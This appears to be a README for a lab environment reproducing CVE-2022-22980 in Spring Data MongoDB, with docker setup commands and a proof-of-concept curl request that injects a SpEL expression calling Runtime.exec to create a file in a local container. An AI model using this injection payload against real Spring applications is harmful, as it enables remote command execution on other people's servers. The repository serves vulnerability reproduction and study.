# Spring-Data-Mongodb-Example

CVE-2022-22980环境

## Build docker environment
```bash
docker build  -t mongo .
docker run -dit -p 6666:6666 mongo
```

## Poc
```bash
➜  Spring-Data-Mongodb-Example git:(main) curl 0:6666/v1/user/get -d 'id=T(java.lang.Runtime).getRuntime().exec("touch /tmp/aaaa")'
{"timestamp":"2022-07-14T01:54:10.828+00:00","status":500,"error":"Internal Server Error","path":"/v1/user/get"}
➜  Spring-Data-Mongodb-Example git:(main) docker exec -it 3a ls -la /tmp
total 4
drwxrwxrwt    5 root     root           123 Jul 14 01:54 .
drwxr-xr-x   19 root     root          4096 Jul 14 01:53 ..
-rw-r--r--    1 root     root             0 Jul 14 01:54 aaaa
```
